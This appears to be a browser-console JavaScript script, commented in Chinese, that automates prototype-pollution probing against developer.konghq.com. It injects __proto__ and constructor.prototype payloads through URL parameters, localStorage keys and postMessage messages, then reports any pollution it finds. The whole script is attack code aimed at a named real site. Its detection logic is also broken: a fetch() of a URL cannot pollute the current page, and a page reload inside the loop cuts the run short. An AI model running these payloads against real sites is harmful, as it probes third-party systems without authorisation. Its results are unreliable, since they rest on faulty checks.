// 原型污染自动化测试 - 直接粘贴到浏览器Console执行
(async function() {
    const results = [];
    
    console.log("=".repeat(80));
    console.log("🎯 原型污染自动化测试");
    console.log("=".repeat(80));
    
    // ========== 测试1: URL参数注入 ==========
    console.log("\n[测试1] URL参数注入");
    
    const payloads = [
        '/plugins/?filter[__proto__][test]=123',
        '/plugins/?search[__proto__][admin]=true',
        '/?q[__proto__][xss]=test',
        '/?__proto__[polluted]=yes'
    ];
    
    for (const path of payloads) {
        const url = 'https://developer.konghq.com' + path;
        console.log(`\n访问: ${path}`);
        
        try {
            await fetch(url);
            
            const polluted = {
                test: {}.test,
                polluted: {}.polluted,
                admin: {}.isAdmin,
                xss: {}.xss
            };
            
            const found = Object.values(polluted).some(v => v !== undefined);
            console.log(`结果: ${found ? '🔴 发现污染!' : '❌ 未污染'}`);
            console.log(`值:`, polluted);
            
            if (found) {
                results.push({ test: 'URL参数', payload: path, result: 'SUCCESS', evidence: polluted });
            }
        } catch(e) {
            console.log(`错误: ${e.message}`);
        }
    }
    
    // ========== 测试2: LocalStorage注入 ==========
    console.log("\n[测试2] LocalStorage注入");
    
    const lsPayloads = [
        ['kapa-config', JSON.stringify({'__proto__': {'test': 123}})],
        ['__proto__', JSON.stringify({'polluted': true})],
        ['config', JSON.stringify({'constructor': {'prototype': {'x': 1}}})]
    ];
    
    for (const [key, value] of lsPayloads) {
        console.log(`\n设置: localStorage.${key} = ${value}`);
        
        const before = {}.test;
        localStorage.setItem(key, value);
        
        // 刷新页面触发合并
        window.location.reload();
        
        // 等待页面加载后检查（需要手动再次执行）
        setTimeout(() => {
            const after = {}.test;
            console.log(`污染前: ${before}, 污染后: ${after}`);
            if (after !== undefined && after !== before) {
                console.log('🔴 发现污染!');
                results.push({ test: 'LocalStorage', payload: key, result: 'SUCCESS', evidence: after });
            } else {
                console.log('❌ 未污染');
            }
        }, 3000);
    }
    
    // ========== 测试3: postMessage注入 ==========
    console.log("\n[测试3] postMessage注入");
    
    const pmPayloads = [
        {'__proto__': {'polluted': true}},
        {'constructor': {'prototype': {'test': 123}}}
    ];
    
    for (const payload of pmPayloads) {
        console.log(`\n发送: ${JSON.stringify(payload)}`);
        
        window.postMessage({
            type: 'kapa-message',
            data: JSON.stringify(payload)
        }, '*');
        
        await new Promise(r => setTimeout(r, 2000));
        
        const polluted = {
            polluted: {}.polluted,
            test: {}.test
        };
        
        const found = Object.values(polluted).some(v => v !== undefined);
        console.log(`结果: ${found ? '🔴 发现污染!' : '❌ 未污染'}`);
        console.log(`值:`, polluted);
        
        if (found) {
            results.push({ test: 'postMessage', payload: JSON.stringify(payload), result: 'SUCCESS', evidence: polluted });
        }
    }
    
    // ========== 生成报告 ==========
    console.log("\n" + "=".repeat(80));
    console.log("📊 测试报告");
    console.log("=".repeat(80));
    console.log(`总测试: ${results.length}`);
    console.log(`成功: ${results.filter(r => r.result === 'SUCCESS').length}`);
    
    if (results.length > 0) {
        console.log("\n🔴 发现的漏洞:");
        results.forEach((r, i) => {
            console.log(`\n[${i+1}] ${r.test}`);
            console.log(`    Payload: ${r.payload}`);
            console.log(`    证据:`, r.evidence);
        });
        console.log("\n🎉 发现原型污染漏洞!");
    } else {
        console.log("\n✅ 未发现原型污染漏洞");
        console.log("\n建议: 这可能是代码质量问题，不是安全漏洞");
    }
    
    console.log("\n详细结果:", JSON.stringify(results, null, 2));
})();
